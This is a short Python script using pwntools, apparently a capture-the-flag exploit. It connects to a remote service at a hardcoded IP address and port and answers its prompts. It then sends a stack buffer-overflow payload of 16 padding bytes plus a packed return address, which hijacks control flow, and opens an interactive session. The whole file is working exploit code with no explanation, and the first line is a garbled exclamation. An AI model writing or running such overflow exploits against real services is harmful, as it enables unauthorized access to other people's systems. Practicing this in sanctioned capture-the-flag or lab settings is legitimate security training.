#KOOOLLL WWWW WAKKELLLL
from pwn import *
p = remote("51.77.140.155", 1403)
p.recvuntil("give the string length:")
p.sendline("100")
p.recvuntil("Enter something")
p.sendline("dummy note")
p.recvuntil("Enter more")
payload = b"A" * 16 + p64(0x00401289) 
p.sendline(payload)
p.interactive()
